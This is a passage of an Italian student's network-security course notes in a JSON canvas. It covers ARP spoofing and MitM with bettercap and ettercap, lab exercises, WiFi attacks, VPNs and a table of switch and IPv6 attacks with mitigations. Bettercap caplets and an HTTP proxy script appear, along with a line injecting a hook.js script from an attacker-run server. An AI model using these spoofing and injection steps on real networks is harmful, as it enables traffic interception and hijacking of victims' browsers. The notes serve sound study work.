ideali per fare il primo talk|\n|**CanSecWest**|Exploit, fuzzing, OS internals|Vancouver|Ospita il contest **Pwn2Own**|\n|**ZeroNights**|Ricerca tecnica avanzata, exploit dev|Russia (ora alt.)|Molto hardcore, poco marketing|\n\n---\n\n## 📈 Stato dell’arte\n\n- Le conferenze oggi sono **sempre più numerose e internazionali**.\n    \n- Si dividono tra:\n    \n    - **formative/professionali** (Black Hat, HITB)\n        \n    - **comunitarie** (DEFCON, CCC, BSides)\n        \n    - **verticali/accademiche** (NDSS, USENIX, etc.)\n        \n- Molte talk sono **disponibili online**, su YouTube o archive.org, quindi il valore educativo è immenso.\n    \n- Molti speaker sono **toolmaker o bug hunter noti** — impari da chi scrive il codice _che fa tremare le aziende_.\n    \n\n---\n\n## 🧠 In sintesi\n\n|Nome|Spirito|Accessibilità|Target|Valore chiave|\n|---|---|---|---|---|\n|DEFCON|Underground|Alta|Hackers, nerd, maker|Libertà, condivisione, comunità|\n|Black Hat|Aziendale|Bassa (€€€)|Profili senior, imprese|Professionalizzazione, visibilità|\n|CCC|Etico-politico|Alta|Hacker europei, attivisti|Diritti digitali, consapevolezza|\n|HITB|Sperimentale|Media|Ricercatori e pentester|Demos, R&D, reverse avanzato|\n\n---\n\nSe vuoi ti posso consigliare anche le **talk più celebri e storiche**, tipo:\n\n- “How I hacked 100 banks in 5 minutes” (HITB)\n    \n- “How the NSA tracks you” (CCC)\n    \n- “Rowhammer.js” (Black Hat)\n    \n- “The Ultimate Bluetooth Hack” (DEFCON)\n    \n\nFammi sapere se ti interessa una playlist curata.","x":-6040,"y":15256,"width":759,"height":1089,"color":"5"},
		{"id":"9acc611c6c85c3cc","type":"text","text":"# Laboratorio 3 - Attacchi Link-Local (`IPv4` & `IPv6`)\n\n###### `Ex1`\n\nQuesto esercizio in pratica chiede di eseguire a mano quello che fa lo script `connect-lab.sh` visto in Laboratorio 1 `Ex4`.  Sarà noioso ma istruttivo credo.\n\n- `sudo ip link del veth1 type veth` + `sudo ip link add veth1 type veth` - Pulisco lo spazio per un cavo virtuale `veth1` e lo ricreo da zero;\n- `sudo ip addr flush veth0` + `sudo ip addr add 192.168.100.27/24 dev veth0` - Pulisco lo spazio per l'indirizzo su `veth0` e lo setto ad un valore valido (i.e. un `IP/mask` coerente con la LAN su cui voglio sniffare);\n- `bridge = sudo docker network ls | grep -e \"kathara_${USER}.*_A\" | grep -o '^[a-z0-9]* '` - Questa cosa è divisa in tre parti:\n\t- Il primo pezzo lista tutte le reti create da Docker;\n\t- Il secondo cerca la LAN che ci interessa, che ha al suo interno la stringa `kathara_${USER}._NomeDellaLAN` (in questo caso `A`, cfr. file `README`);\n\t- Il terzo isola soltanto il `NetworkID` di tale `LAN A`;\n\t- Chiaro che se fai tutto questo fuori da uno script puoi dare semplicemente il primo comando e poi copia e incolla.\n- `sudo ip link set veth1 master kt-${bridge}` - Qui il punto è: la rete su Docker è identificata dal `NetworkID`, ma se voglio collegarmi ad essa devo farlo tramite un bridge virtuale (che nel nostro caso assomiglia più ad un hub, perché saremo in grado di vedere il traffico di tutti). Tale dispositivo virtuale ha identificativo `kt-$NetworkID` (in genere sarebbe `br-`, ma qui siamo su `Katharà`), ed è a questo che colleghiamo il nostro cavo virtuale `veth1`;\n- `sudo ip link set veth0 up` + `sudo ip link set veth0 up` - \"Accendiamo\" le due interfacce;\n- `ip addr show dev veth0` + `ip addr show dev veth1` - Eventualmente osserviamo cosa abbiamo combinato\n\nControlliamo se è andato tutto bene con `sudo arp-scan --interface=veth0 --localnet` o direttamente `tcpdump -i veth0`.\n\n###### `Ex2`\n\nIl `README` suggerisce di collegarci alla LAN come nell'`ex1`, quindi ho fatto copia e incolla dello script `connect-lab` ma ora si può chiamare senza parametri: ci chiamiamo `192.168.100.27`. Detto questo, avviamo `./bettercap -iface eth0` e facciamo `ARP Poisoning`, con obiettivo MitM a tutti gli host. Vediamo il caplet `proxyspoof.cap` per trarre ispirazione:\n\n- Inizia col fare uno scan della rete locale (`net.probe on` -> `sleep 3` -> `net.probe off`);\n- Visto che sa già cosa troverà fa un `set gateway.address 192.168.100.1` (se non gli dico esplicitamente chi è il default GW in genere lo rileva da solo);\n- Per lo stesso motivo di prima fa `set arp.spoof.targets 192.168.100.10, 192.168.100.80, 192.168.100.200` (i.e. attacca solo gli `host`);\n- Setta tutti i parametri per fare MitM (`set arp.spoof.internal true`, `set arp.spoof.fullduplex true`);\n- Fa partire il modulo di spoofing con `arp.spoof on`;\n\t- L'obiettivo di tutta questa prima parte è fare in modo che nelle tabelle `ARP` di tutti i `target` gli `IP` del `gateway` e degli altri `host` siano tutti associati al `MAC Address` dell'attaccante (realizzato bombardando la rete con le `gratuitous ARP`, che associano qualsiasi `IP` della sottorete al `MAC Address` dell'attaccante). Qualsiasi pacchetto vogliano inviare passerà così per l'attaccante;\n\t- Nota che questo produce migliaia di pacchetti `ARP` sulla LAN (non esattamente un attacco stealth, ecco).\n- Imposta e avvia il server proxy `http` MitM con `set http.proxy.script http-proxy-pwned.js` + `http.proxy on`;\n\t- Questo script `javascript` definisce in generale il comportamento del proxy. Ne vediamo un esempio a destra;\n\t- Questo innesca il seguente comportamento: un `host` sulla rete fa una richiesta al `server` legittimo (`192.168.100.80`) per aprire una connessione `TCP` (i.e. manda una `SYN`), ma visto che la sua `ARP cache` è `poisoned` finisce per mandarlo al `MAC Address` dell'attaccante, che legge tutto e inoltra a suo nome quella stessa richiesta al vero `server`. Uno sniffer come ***Wireshark*** è in grado di rendersi conto che questa è una ***TCP Retransmission*** (mi sa che non entreremo nel dettaglio su come lo decide, diciamo che lo fa e basta);\n\t- Se invece di inoltrare e basta modifico anche qualcosa (come accade dal momento in cui carico `http-proxy-pwned.js`) smetto di fare ***MitM passivo*** e inizio prevedibilmente a fare ***MitM attivo***.\n- Attiva il ***modulo sniffer*** con `set net.sniff.verbose true`, `set net.sniff.output /home/sniff_bettercap.pcap` e `net.sniff on`.\n\nControlliamo se è andato tutto bene con una `wget 192.168.100.80:80/kittens.html` oppure visitando la pagina da browser (devi includere tra i `target` l'indirizzo `IP` con il quale ti connetti alla LAN, nel mio caso `192.168.100.27`).\n\n###### `Ex3`\n\n\n<span style=\"color:rgb(236, 155, 14)\">A questo punto la registrazione esplode. Santodio. Mi sa che qui ci torniamo dopo aver finito la teoria.</span>\n\n\n\n###### `Ex4+`\n\n<span style=\"color:rgb(236, 155, 14)\">Inizio Lectio 15/5.</span>","x":-4022,"y":13932,"width":1259,"height":2413,"color":"3"},
		{"id":"10a5bd3e26d80c50","type":"text","text":"# `ettercap` & `bettercap`\n\n`ettercap` è un tool di attacco su LAN nato nei primi anni 2000, quando la gente mangiava pane e MitM. Può fare `arp spoofing`, `injection`, `sniffing` e altre cose carine con poco effort da parte di chi lo usa:\n\n- Le funzioni sono integrate in comandi di alto livello, e.g. scrivo `ettercap -T -M arp /target1/ /target2/` e lascio andare, lui fa `arp spoofing` e `sniffing` in automatico;\n\t- Questo modo di funzionare è detto \"out of the box\", un modo per dire \"ready to go\" (perché non dire direttamente \"ready to use\" o simili? Boh...).\n- Questo in realtà è sia un punto di forza che di debolezza: non ho grosse possibilità di personalizzazione e automazione di script complessi.\n\n[bettercap](https://www.bettercap.org/project/introduction/), come si può intuire, è un po' la sua versione evoluta, pensata per essere un \"coltellino svizzero\" (quanto piace questa espressione oh) per quelli della squadra rossa. Scritto in Go (leggerissimo) e distribuito come singolo eseguibile con poche dipendenze.\n\nSi avvia con `sudo bettercap -iface eth0`, e fornisce una `shell`. Cosa scriviamo?\nLa logica del programma si basa sui ***moduli***, ognuno avente un determinato compito e dei parametri da specificare. Facciamo qualche esempio.\n\n- `net.probe`fa un `arp-scan`, `net.show` mostra la mappatura di rete così ottenuta;\n\t- Meglio ancora `net.recon`, che è una versione più evoluta.\n- `arp.spoof` esegue attacchi di `arp spoofing`;\n\t- Un parametro interessante qui è `set arp.spoof.fullduplex true`, i.e. mi fingo il `gateway` per il `target` ed il `target` per il `gateway` (in breve, faccio ***MitM***);\n\t- Se non faccio `set arp.spoof.targets <IP1>,<IP2>` attacco letteralmente tutti :)\n\t- `set arp.spoof.internal true` fa MitM tra due `host`, senza passare dal GW.\n- `dns.spoof` ti pubblicizza come server DNS e risponde con quello che vuoi tu;\n\t- Similmente a `arp.spoof.targets`, `set dns.spoof.domains <domain1>,<domain2>` limita il tuo MitM DNS a pochi domini (altrimenti ti toccherebbe avere un intero vero server DNS, se non ce l'hai ti sgamano subito).\n- `http.proxy`, `https.proxy` ti permettono di diventare un `proxy` trasparente  (di nuovo, ***MitM***) in modo da sniffare, modificare e iniettare (`http.js`) nel traffico `http(s)`;\n\t- `set http.proxy.sslstrip true` prova a degradate la connessione da `https` ad `http`. Se ha successo, tutto il traffico diventa in chiaro;\n\t- `set http.proxy.js <file.js>` inietta codice `.js` in tutte le pagine visitate dal malcapitato al quale mi sono messo in mezzo.\n- `wifi.reckon` permette di fare scansioni ed effettuare tutti gli attacchi che abbiamo discusso in ***WiFi Security***.\n\nChiamare `on` su un modulo significa eseguirlo in background. Posso eseguire compiti complessi tramite script: si chiamano ***caplets*** e sono scritti in file `.cap`.","x":-5031,"y":13932,"width":759,"height":1089,"color":"4"},
		{"id":"14f615c600cff155","type":"text","text":"# Introduzione agli Attacchi Link-Local\n\nCondizione necessaria per fare un qualsiasi tipo di attacco in locale è trovarsi in un punto in cui passa il traffico del bersaglio. Ma non è ovvio? No.\n\n- Se siamo tutti attaccati allo stesso cavo `ethernet` o se i cavi sono interconnessi tramite ***hub*** ovviamente funziona, ma il 1990 è passato da un pezzo;\n- Se la rete è ***wireless*** in qualche modo la situazione è simile (anche qui abbiamo un broadcast di tutti i dati verso tutti gli utenti), ma di certo c'è di mezzo la crittografia;\n- Un bridge è un collegamento tra due reti che opera nel seguente modo: quando gli arriva un pacchetto da una parte decide se inoltrarlo o meno dall'altra, basandosi sull'indirizzo `MAC` di destinazione. Implementa per primo il concetto di ***segmentazione*** della rete. Qua inizia a profilarsi il bisogno \"come sniffo il traffico dell'altra rete?\";\n- Se (com'è più probabile) siamo in una rete interconnessa da ***switch*** (i.e. un bridge multiporta) dobbiamo pensare un attimo ad un piano di attacco, perché altrimenti siamo esclusi dal traffico altrui.\n\nBene, in che modo possiamo attaccare una rete con switch per leggere il traffico altrui? cfr. ***Cattura Standard o Aggressiva?*** per i metodi base, ma come dicevamo ne esistono altri:\n\n- ***Switch Spoofing*** - Autoesplicativo, mi fingo lo switch;\n- ***VLAN Hopping*** - Se mal configurata, posso mettere due tag uno dietro l'altro per accedere ad entrambe le VLAN;\n- Ci si può fingere router su `IPv4` con la `gratuitous ARP response` (i.e. pubblicizzo il mio `MAC` come associato all'`IPv4` del router, che è il default GW degli `host`, in modo tale che quando questi vogliono andare su Internet passano prima dall'attaccante tramite il suo MAC e poi (forse) dal vero GW;\n- Possiamo farlo anche su `IPv6` con le RA (forse è anche fin troppo facile);\n- Molti altri, era giusto per fare un esempio. A destra li trovi (quasi) tutti.\n\nE come realizziamo tutte queste belle cose?\n\nWireshark permette di fare sniffing passivo in condizioni ottimali (i.e. siamo già nella stessa LAN senza alcuno switch). Se sto attaccando le condizioni saranno più avverse di così, quindi mi servono strumenti attivi per realizzare `CAM Overflow/MAC Flooding`, e.g. ***macof***), `arp spoofing/poisoning` e ***Man in the Middle*** (e.g. `ettercap`, ***bettercap***, `dsniff`).\n\nUna scelta tipica è usare tool attivi, salvare lo sniffing ed analizzarlo a posteriori con Wireshark.","x":-3772,"y":12588,"width":759,"height":1105,"color":"4"},
		{"id":"bda37501c4e02ebf","type":"text","text":"# Wireless Security (cenni)\n\nFino ai primi anni 2000 la crittografia in WiFi era affidata al protocollo ***Wired Equivalent Privacy*** (***WEP***). In pratica, tutti quanti condividevano la stessa chiave e crittavano ogni pacchetto con essa. O quasi. Una chiave ***RC4*** era così composta:\n\n```\nRC4_key = Initialization_Vector (3 byte) || Shared_Secret (5-13 byte)\n```\n\nQuesto ***Initialization Vector*** (***IV***) veniva inviato in chiaro dal router, ed essendo lungo solo `24 bit` era facile che venisse riutilizzato in tempi brevi. Quindi, abbiamo una situazione in cui possiamo accumulare pacchetti e in cui spesso conosciamo l'inizio della chiave. Guardando la parte iniziale (possiamo più o meno intuire cosa c'è scritto in un `header IP`) è possibile ricostruire pezzo dopo pezzo lo `shared secret`, rompendo l'intero cifrario.\n\nVisto che non si poteva di colpo buttare via l'intero protocollo, ***WiFi Protected Access*** (***WPA***, 2003) nasce come soluzione temporanea per aggiustare un po' il tiro. Come? Tramite il ***Temporary Key Integrity Protocol*** (***TKIP***), che introduce i seguenti concetti:\n\n- ***Pre-Shared Key*** (***PSK***) - Tipicamente la password che inserisci quando ti connetti, un segreto condiviso da `AP` e `host` utile a ricavare una ***PMK*** (***Pairwise Master Key***);\n- ***4-Way Handshake*** - A partire dalla PMK si negozia una ***Pairwise Transient Key*** (***PTK***) usata per crittare l'effettivo scambio di messaggi con quel singolo `host`;\n- ***Message Integrity Code*** (***MIC***) - Autoesplicativo, ma implementato in modo debole.\n\nViene inoltre estesa la lunghezza dell'IV (`48 bit`), ma tutto questo non risolve le debolezze strutturali. Basta sniffare l'handshake con `airodump-ng`, fare bruteforce sui possibili PSK con `aircrack-ng`, simulare un handshake e vedere se produce le stesse chiavi che ho sniffato. Se sì, ho trovato PSK. La cosa buona è che ogni `host` ora negozia una propria chiave unica con l'`AP`, quella cattiva è che tale chiave è ancora facilmente desumibile (perché la PSK è uguale per tutti gli `host`). ***WPA2*** sostituisce RC4 con ***AES***, ma non apporta grandi migliorie su questo fronte.\n\nNonostante questo, il protocollo regge dal 2004 al 2017, quando compare l'***attacco KRACK***. Qualcuno dopo 13 anni si è reso conto che basta reinviare il terzo messaggio dell'handshake per forzare la vittima a riutilizzare lo stesso nonce. tl, dr: decritto il traffico.\n\nForse è per questo che poco dopo, nel 2018, esce ***WPA3***. Ed è una roba tosta da rompere, perché si basa sull'idea che non puoi più fare bruteforce offline. Seguono paroloni. Usiamo un protocollo di handshake a 4 vie detto ***SAE*** (Simultaneous Authentication of Equals), che sia basa su uno schema di scambio di chiavi ***Password Authenticated Key Exchange*** (***PAKE***), nello specifico ***Dragonfly*** (per capirci, è una sorta di Diffie-Hellman in cui ti scambi i segreti senza farli vedere a chi origlia). La PSK c'è (banalmente, è di nuovo la password), ma non viene usata per derivare la chiave di crittazione, solo per validare l'handshake. Risultato? Anche se dopo anni scopri la PSK non riuscirai comunque a decrittare i pacchetti.","x":-5031,"y":12588,"width":759,"height":1105,"color":"4"},
		{"id":"0f10398d54fe39b2","type":"text","text":"Gli switch hanno le CAM tables (MAC/PORTA) mentre gli host hanno le ARP tables (IP/MAC). Unused MAC are removed. come faccio spoofing? esiste una gratuitous ARP response che è tipo una unsolicited advertisement con cui pubblico la mia associazione. l'host 1.1.1.2 si pubblicizza ripetutamente come 1.1.1.254 (il router) in modo che tutti passino da lui. posso iniziare a pensare di fare MitM. Posso farlo con il router, il DNS, un altro host...","x":-3644,"y":12100,"width":503,"height":293},
		{"id":"86afbb36e3ee27dc","type":"text","text":"# SPACING","x":-2763,"y":13693,"width":250,"height":235,"color":"5"},
		{"id":"046838ca56a5d1a2","type":"text","text":"## 🛰 Modalità di cattura traffico\n\n### 1️⃣ **Cattura “pulita”**\n\n- **TAP (Test Access Point)** – Dispositivo fisico che si mette in mezzo e copia tutto il traffico. Zero interferenze, zero trucchi.\n    \n- **Port Mirroring** – Configurazione su switch managed per duplicare traffico da porte/VLAN verso la porta di sniffing.\n    \n\n---\n\n### 2️⃣ **Abuso dello switch**\n\n- **MAC Flooding / CAM Overflow** – Inondare lo switch di entry `(MAC, Porta)` fake → tabella CAM satura → switch in _fail-open_ → broadcast di frame.\n    \n    - **+ ARP Spoofing** per tenere la situazione in fail-open più a lungo.\n        \n    - Tool: `macof`, `ettercap`.\n        \n    - Mitigazione: Port security, Dynamic ARP Inspection.\n        \n- **VLAN Hopping**\n    \n    - _Switch Spoofing_: negoziazione trunk → traffico multi-VLAN.\n        \n    - _Double Tagging_: doppio 802.1Q tag → salto VLAN.\n        \n    - Mitigazione: disabilitare DTP, VLAN native “vuota”, filtrare doppi tag.\n        \n- **STP Manipulation** – Farsi eleggere root bridge (BPDU falsi) per deviare traffico.\n    \n    - Tool: `yersinia`.\n        \n    - Mitigazione: BPDU Guard, Root Guard.\n        \n\n---\n\n### 3️⃣ **Abuso dei protocolli di rete locale**\n\n- **ARP Spoofing / Poisoning** – Annunciare falsi mapping `(IP, MAC)` per ricevere traffico destinato ad altri.\n    \n    - Tool: `ettercap`, `dsniff`.\n        \n    - Mitigazione: DAI.\n        \n- **DHCP Redirection / Starvation**\n    \n    - _Starvation_: esaurire pool IP sul DHCP legittimo.\n        \n    - _Rogue DHCP_: fornire gateway/DNS dell’attaccante.\n        \n    - Mitigazione: DHCP snooping, porte “trusted”.\n        \n- **Routing Protocol Hijack** – Pubblicizzarsi come next-hop in RIP/OSPF/EIGRP.\n    \n    - Mitigazione: autenticazione nei protocolli.\n        \n\n---\n\n### 4️⃣ **Abuso di IPv6**\n\n- **Rogue Router Advertisement** – Pubblicizzarsi come router IPv6 predefinito (anche in reti IPv4-only).\n    \n    - Tool: `mitm6`.\n        \n    - Mitigazione: RA Guard.\n        \n\n---\n\n### 5️⃣ **Wireless**\n\n- **Evil Twin AP** – AP clone con stesso SSID e segnale più forte → client si collegano all’attaccante.\n    \n    - Tool: `airbase-ng`, `wifiphisher`.\n        \n- **Deauth Attack** – Invio pacchetti di disassociazione per forzare client a ricollegarsi (al tuo AP o per sniffare handshake WPA/WPA2).\n    \n    - Tool: `aireplay-ng`.\n        \n    - Mitigazione: WPA3 + Management Frame Protection (802.11w).\n        \n\n---\n\n💡 **Nota**: in quasi tutti i metodi _sporchi_, l’obiettivo non è solo sniffare, ma _portare il traffico su di te_ → quindi stai facendo di fatto un MITM a livello L2/L3.\n\n---\n\nSe vuoi, posso **aggiungere per ogni tecnica un mini-schema** con il flusso del traffico _prima_ e _dopo_ l’attacco, così da avere un colpo d’occhio visivo che ti resta più impresso.  \nTi sarebbe utile per i tuoi appunti?","x":-1520,"y":12588,"width":759,"height":1105},
		{"id":"772c35850a4885a5","type":"text","text":"| **Tecnica**                           | **Livello OSI** | **Obiettivo**                                 | **Tool tipico**                     | **Mitigazione**                          |\n| ------------------------------------- | --------------- | --------------------------------------------- | ----------------------------------- | ---------------------------------------- |\n| **TAP (Test Access Point)**           | 1 (Fisico)      | Copiare passivamente tutto il traffico        | Nessuno (hardware dedicato)         | Controllo accesso fisico                 |\n| **Port Mirroring**                    | 2 (Data Link)   | Copia traffico da porte/VLAN specifiche       | Wireshark, tcpdump                  | Disabilitare mirroring non autorizzato   |\n| **MAC Flooding / CAM Overflow**       | 2               | Forzare switch in fail-open → broadcast       | `macof` (dsniff suite)              | Port security, CAM limit                 |\n| **ARP Spoofing / Poisoning**          | 2               | Impersonare un host per intercettare traffico | `ettercap`, `bettercap`, `arpspoof` | Dynamic ARP Inspection (DAI)             |\n| **DHCP Starvation + Rogue DHCP**      | 2               | Impostarsi come gateway predefinito           | `yersinia`, `dhcpstarv`             | DHCP snooping, porte trusted             |\n| **ICMP Redirect Abuse**               | 3 (Rete)        | Indicare rotta \"migliore\" verso attaccante    | `ettercap`                          | Bloccare ICMP redirect, ACL router       |\n| **VLAN Hopping (Double Tag)**         | 2               | Inviare traffico cross-VLAN                   | Frame craftato manualmente          | Disabilitare trunk non necessari         |\n| **STP Manipulation**                  | 2               | Diventare Root Bridge → instradare traffico   | `yersinia`                          | BPDU Guard, Root Guard                   |\n| **Routing Protocol Hijack**           | 3               | Prendere controllo path routing               | `scapy`, `zebra`                    | Autenticazione routing protocol          |\n| **Rogue Router Advertisement (IPv6)** | 3               | Impostarsi come router IPv6                   | `mitm6`                             | RA Guard, disabilitare IPv6 se non usato |\n| **Evil Twin AP (Wi-Fi)**              | 2/3 wireless    | Forzare client a collegarsi a AP malevolo     | `airbase-ng`, `wifiphisher`         | WPA2-Enterprise, 802.1X                  |\n| **Wi-Fi Deauthentication Attack**     | 2 wireless      | Disconnettere client → forzare reconnessione  | `aireplay-ng`                       | 802.11w (PMF)                            |\n","x":-520,"y":12588,"width":759,"height":1105},
		{"id":"6d324bfb0f21dfa5","type":"text","text":"`watch` comando bellissimo che esegue un comando successivo ogni due secondi","x":-2513,"y":12287,"width":759,"height":233},
		{"id":"64606e2cd50fe644","type":"text","text":"# SPACING","x":3007,"y":6795,"width":250,"height":235,"color":"5"},
		{"id":"f64dacbc79ba49ce","type":"text","text":"# Bash - Variabili Speciali\n\n- **`$0`** → Nome dello script o comando invocato.\n- **`$1`, `$2`, `$3`, …** → Parametri passati allo script/func, in ordine.\n- **`$#`** → Numero di parametri passati (escluso `$0`);\n- **`$*`** → Tutti i parametri come _un'unica stringa_ (`\"$*\"` → `\"param1 param2 param3\"`);\n- **`$@`** → Tutti i parametri come _lista_ (`\"$@\"` → `\"param1\"` `\"param2\"` `\"param3\"`), più sicuro per gli spazi.\n- **`$?`** → _Exit status_ dell’ultimo comando eseguito (0 = ok, diverso da 0 = errore).\n- **`$$`** → PID del processo corrente (lo script stesso).\n- **`$!`** → PID dell’ultimo comando eseguito _in background_.\n- **`$-`** → Flag attive della shell (`set -x`, `set -e`, ecc.). \n- **`$_`** → Ultimo argomento dell’ultimo comando eseguito (o nome del comando corrente in certi contesti)","x":2248,"y":6795,"width":759,"height":646,"color":"3"},
		{"id":"ea00aea033eeb7de","type":"text","text":"# `bettercap caplets`\n\nCome ogni linguaggio che consente gli script, anche qui mettiamo uno dopo l'altro tutti i comandi che ci servono per eseguire un certo compito. `arp_mitm.cap` potrebbe ad esempio essere una cosa del tipo\n\n```python\nset arp.spoof.targets 192.168.1.5\nset arp.spoof.fullduplex true\narp.spoof on\n\n# Mostra gli eventi importanti a schermo\nticker.events on\n```\n\nVerrà poi chiamato con `bettercap -caplet /path/to/arp_mitm.cap`. Altro esempio:\n\n<span style=\"color:rgb(236, 155, 14)\">Inserire qui un caplet utile quando capisci meglio quanto in là puoi spingerti</span>\n","x":-6040,"y":13932,"width":759,"height":1089,"color":"3"},
		{"id":"6047167e407da7c5","type":"text","text":"- **STP Manipulation** – Se la rete usa _**Spanning Tree Protocol**_ per evitare loop, posso provare a convincere lo switch che _io_ sono il root bridge. In questo modo il traffico verso certe destinazioni passa da me. Si fa inviando _**BPDU**_ con priorità più alta (valore più basso) rispetto all’attuale root;\n    \n    - Strumenti: `yersinia`;\n        \n    - Mitigazione: _**BPDU Guard**_ e _**Root Guard**_ sugli switch.\n        \n- **VLAN Hopping** – Se la LAN è segmentata in VLAN, con configurazioni sbagliate posso uscire dalla mia VLAN e sniffare in altre:\n    \n    - _**Switch Spoofing**_: mi fingo un altro switch, forzando una trunk link negotiation (802.1Q) così ricevo traffico di più VLAN;\n        \n    - _**Double Tagging**_: invio frame con doppio 802.1Q tag, sfruttando switch mal configurati per farli arrivare ad altre VLAN;\n        \n    - Mitigazione: disattivare DTP, usare VLAN native non usate per traffico reale, filtrare i tag doppi.\n        \n- **MITM via Rogue AP** – In reti wireless, creo un access point con stesso SSID e più potenza del segnale dell’AP legittimo. Gli host si connettono a me e io passo (o manipolo) il traffico;\n    \n    - Variante: Evil Twin con captive portal per catturare credenziali;\n        \n    - Strumenti: `airbase-ng`, `wifiphisher`;\n        \n    - Mitigazione: WPA3 Enterprise, certificati, rilevamento AP non autorizzati.\n        \n- **Proxy/Router Rogue su Rete Cablata** – Simile al Rogue DHCP, ma invece di fare starvation, mi limito a collegarmi alla rete e pubblicizzarmi via _**RIP**_, _**OSPF**_ o _**EIGRP**_ come rotta preferenziale;\n    \n    - Mitigazione: autenticazione sui protocolli di routing.\n        \n- **MITM via IPv6 Abuse** – Se la rete supporta IPv6, posso sfruttare _**Router Advertisement**_ per pubblicizzarmi come router IPv6 predefinito. Funziona anche se la rete è “solo IPv4” ma IPv6 non è disabilitato sugli host (molto comune);\n    \n    - Strumenti: `mitm6`;\n        \n    - Mitigazione: RA Guard sugli switch.\n        \n- **ARP Broadcast Storm “controllato”** – Variante dell’ARP spoofing: non cerco di avvelenare un singolo target, ma bombardo la rete con ARP gratuitous che associano più IP possibili al mio MAC, in modo da ricevere traffico destinato a tanti host contemporaneamente;\n    \n    - Mitigazione: DAI, port security.","x":-2513,"y":12588,"width":759,"height":1105},
		{"id":"fcf2a9494e9d66a3","type":"text","text":"# Comportamento Javascript & Injection (XSS)\n\nIl file indicato in `set http.proxy.script http-proxy-pwned.js` definisce il comportamento del `proxy http` al verificarsi di varie condizioni. Vediamone un esempio.\n\n```javascript\n// Invocata appena carico lo script (i.e. all'avvio del proxy)\nfunction onLoad() {\n\tlog(\"Script loaded\")  // In questo caso c'è poco da dire qua\n}\n// Invocata quando un host fa una richiesta al server HTTP\nfunction onRequest() {\n\t// Qui più in generale potrei passare la req come argomento\n\t// Mi permetterebbe di modificare la richiesta prima che arrivi al server\n\tlog(\"New request\")\n}\n// Invocata quando, dopo aver inoltrato la richiesta, ricevo la risposta\nfunction onResponse(req, res) {\n\tlog(\"New response\")\n\tif(res.ContentType.indexOf('text/html') == 0) {\n\t\t// Se la risposta è testuale (i.e. una pagina)...\n\t\tvar body = res.ReadBody(); // ... leggi il body\n\t\tres.Body = body.replace('img src=\"kittens.jpg\"',\n\t\t\t\t\t\t\t\t'img src=\"jollypwn.png\"');\n\t\t// E sostituisci la prima stringa (se c'è) con la seconda\n\t\tlog(\"kittens pwned\");\n\t}\n}\n```\n\nÈ abbastanza ovvio che quel `kittens pwned` è abbastanza ottimistico. Se il body non contiene `img src=kittens.jpg` non sto `pwnando` un bel niente. Ma vabbè.\n\nPoi il buon Angelo ci fa notare che per fare ***injection*** basta sostituire `</head>` con `'<script type=\"text/javascript\" src=\"http://<server>:3000/hook.js\"> </script></head>'`, dove\n\n- `<server>` è un placeholder, diventa l'indirizzo del mio `rogue server` (e.g. il mio pc);\n- `3000` è una `porta` standard su cui vengono aperti solitamente i `web server`.\n\nIn pratica dovrei aprire un `server http` su quella `porta` e rendere disponibile il codice `.js` da iniettare, e.g. andando nella cartella che contiene `hook.js` ed avviare\n\n```bash\npython3 -m http.server 3000   # Con Python\nnpx http-server -p 3000       # Con NPM\n```\n\nQuesta simpaticheria è anche conosciuta come ***Cross-Site Scripting*** (***XSS***).","x":-2513,"y":13928,"width":759,"height":1105,"color":"4"},
		{"id":"ef928ca5c1df8fca","type":"text","text":"# VPN\n\nUna ***Virtual Private Network*** (***VPN***) è una rete virtuale costruita sopra una rete *not trusted* esistente (e.g. Internet, ma anche un ISP) con lo scopo di implementare una comunicazione sicura (e.g. confidentiality, anonymity, authentication).\n\nQuesto si traduce nel configurare diversi endpoint della rete in modo da implementare\n\n- ***Incapsulamento*** - Ma come, non lo fanno già tutti quelli che usano la stack `TCP/IP`? Sì, ma qui lo usiamo per implementare dei ***tunnel*** che ci fanno apparire in altri posti sulla rete (cfr. ***Schemino coi Colori***). Di fatto, questo meccanismo è l'implementazione della parola \"***Virtual***\": stiamo creando un'astrazione logica al di sopra delle reti esistenti (i.e. stiamo modificando la topologia logica senza toccare quella fisica);\n\t- Posso fare in modo che attraverso il tunnel passi tutto il traffico (***full tunneling***) o solo una parte (***split tunneling***). L'implementazione in questo secondo caso avviene banalmente con le tabelle di routing dell'`host`: \"`se la destinazione fa parte di quelle incluse nel tunnel, invia il pacchetto al gateway VPN, altrimenti mandalo al default gateway`\";\n\t- Possiamo realizzare il tunnel direttamente tra due `host`, tra un `host` e un `server` (è quello che generalmente avviene quando usiamo `openvpn` per connetterci al `server` che ci introduce alla `LAN ACME`) e direttamente tra due `server` (e.g. vogliamo creare una `VLAN` che collega due `LAN` distanti su Internet).\n- ***Crittografia*** - La si potrebbe pensare come principio fondante di una VPN, usata per implementare il concetto di \"***Private***\". Questo è vero solo in parte. Quella parola si riferisce anzitutto ad un isolamento logico dato dal fatto che solo gli utenti autorizzati possono usare la VPN, poi sicuramente è fortemente auspicabile crittare i payload.\n\t- Ad oggi, la crittografia si può realizzare a livello di Rete (***IPsec***) o di Trasporto/Applicazione (***SSL/TLS***).\n\nPossiamo dire quindi in prima analisi che l'idea primaria di una VPN è quella di creare dei tunnel per soli utenti autorizzati, e che quindi il suo obiettivo primario è l'***autenticazione***. Senza di essa, perde di senso il concetto stesso di rete \"privata\". Successivamente, con la crittografia, introduciamo anche ***confidenzialità*** e ***integrità***. Richiediamo inoltre che la `VPN` sia quanto più possibile ***invisibile*** per il client (i.e. flessibile, nel senso utilizzabile da diverse applicazioni senza grosse modifiche, e facile da usare sulla singola applicazione).\n\nPossiamo scegliere di piazzare il nostro server VPN in diversi punti della rete:\n\n- ***Nel Firewall*** - Scelta più comoda, ma espone la rete interna;\n- ***Dietro il Firewall*** - Più sicuro, ma bisogna fare port forwarding\n- ***DMZ*** - Compromesso <span style=\"color:rgb(236, 155, 14)\">Boh sta parte la sto scrivendo perché la devo scrivere, ma non ne vedo un senso</span>\n","x":-10580,"y":19890,"width":759,"height":1089,"color":"6"},
